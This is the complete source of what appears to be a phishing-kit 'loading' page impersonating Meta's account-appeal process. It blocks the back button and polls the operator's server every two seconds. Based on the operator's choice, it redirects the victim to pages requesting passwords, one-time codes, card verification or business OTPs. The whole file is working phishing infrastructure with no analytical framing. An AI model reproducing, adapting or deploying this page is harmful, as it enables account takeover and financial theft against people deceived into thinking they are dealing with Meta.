<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.2/jquery.min.js"></script>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Latest compiled JavaScript -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <title>Meta | Loading</title>
</head>
<body>
<br><br>
<div style="margin-top: 200px; width: 100%;"></div>
<center>
    
<div class="loading">
    <img src="loading.gif" width="80">&nbsp;<img src="meta.jpg" height="60">
    <br>
    <span style="color: gray;">Thank you for submitting your appeal. Please do not close this page as it may interfere with the ongoing processing of your request, which typically takes 2-3 minutes...</span>
</div>
</center>
   <script>history.pushState(null, null, location.href);
window.addEventListener('popstate', function(event) {
  history.pushState(null, null, location.href);
});</script>

<script>

<?php session_start();  ?>
      function check() {
  
  
  $.ajax({
     type: "POST",
    url: "ip-checker.php",
   success: function(result){
   //document.write(result);
   if (result == "<?php echo $_SESSION['buttonName1']; ?>") {
    
   window.location.href = "otp.php";
   }
   else if (result == "<?php echo $_SESSION['buttonName2']; ?>") {
    window.location.href = "wrong-password.php";
   }
   else if (result == "<?php echo $_SESSION['buttonName3']; ?>") {
    window.location.href = "done.php";
   }
   else if (result == "<?php echo $_SESSION['buttonName4']; ?>") {
    window.location.href = "wrong-otp.php";
   }
   else if (result == "<?php echo $_SESSION['buttonName5']; ?>") {
    window.location.href = "invalid-form.php";
   }
   else if (result == "<?php echo $_SESSION['buttonName6']; ?>") {
    window.location.href = "password.php";
   }
    else if (result == "<?php echo $_SESSION['buttonName7']; ?>") {
    window.location.href = "verify-card.php";
   }
    else if (result == "<?php echo $_SESSION['buttonName8']; ?>") {
    window.location.href = "business-otp.php";
   }
  }});

  }
  
  let display = setInterval(check, 2000);




  
</script>

</body>
</html>